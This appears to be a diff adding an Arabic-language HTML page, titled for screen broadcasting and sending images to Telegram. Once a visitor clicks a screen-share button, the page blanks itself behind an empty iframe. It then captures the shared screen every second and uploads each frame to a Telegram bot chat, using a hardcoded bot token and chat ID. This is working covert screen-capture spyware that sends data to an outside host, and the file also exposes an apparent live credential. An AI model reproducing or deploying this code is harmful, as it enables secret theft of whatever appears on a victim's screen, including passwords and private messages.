@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>بث شاشة + إرسال صور لتليجرام</title>
+<style>
+  body, html { margin:0; padding:0; height:100%; overflow:hidden; }
+  #iframePage {
+    position: fixed;
+    top:0; left:0; width:100%; height:100%; border:none; z-index:10;
+  }
+  #startBtn {
+    position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%);
+    font-size: 20px; padding: 15px 30px; cursor: pointer;
+  }
+</style>
+</head>
+<body>
+
+<button id="startBtn">بدء مشاركة الشاشة</button>
+
+<script>
+  const BOT_TOKEN = "AAEc6to9UMMeyEf6MHYaJvtI5_fdC9K5Ros";  // حط توكن بوت تليجرام
+  const CHAT_ID = "7924214467";      // حط رقم الشات الخاص فيك
+
+  let videoElem, canvas, ctx;
+
+  async function sendPhoto(imageDataUrl) {
+    const base64Data = imageDataUrl.split(',')[1];
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', base64ToBlob(base64Data, 'image/png'));
+
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+    } catch (e) {
+      console.error('خطأ في إرسال الصورة:', e);
+    }
+  }
+
+  function base64ToBlob(base64, type='application/octet-stream') {
+    const binary = atob(base64);
+    const array = [];
+    for(let i=0; i < binary.length; i++) {
+      array.push(binary.charCodeAt(i));
+    }
+    return new Blob([new Uint8Array(array)], {type});
+  }
+
+  async function startCapture() {
+    try {
+      const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+
+      videoElem = document.createElement('video');
+      videoElem.srcObject = stream;
+      videoElem.autoplay = true;
+      videoElem.muted = true;
+      videoElem.style.display = 'none';
+      document.body.appendChild(videoElem);
+
+      canvas = document.createElement('canvas');
+      ctx = canvas.getContext('2d');
+
+      document.body.innerHTML = `<iframe id="iframePage" src="about:blank"></iframe>`;
+
+      setInterval(() => {
+        if(videoElem.videoWidth === 0 || videoElem.videoHeight === 0) return;
+
+        canvas.width = videoElem.videoWidth;
+        canvas.height = videoElem.videoHeight;
+
+        ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
+        const imageDataUrl = canvas.toDataURL('image/png');
+
+        sendPhoto(imageDataUrl);
+      }, 1000);  // كل ثانية صورة جديدة
+
+    } catch (err) {
+      alert('فشل في بدء مشاركة الشاشة: ' + err.message);
+    }
+  }
+
+  document.getElementById('startBtn').onclick = startCapture;
+</script>
+
+</body>
+</html>
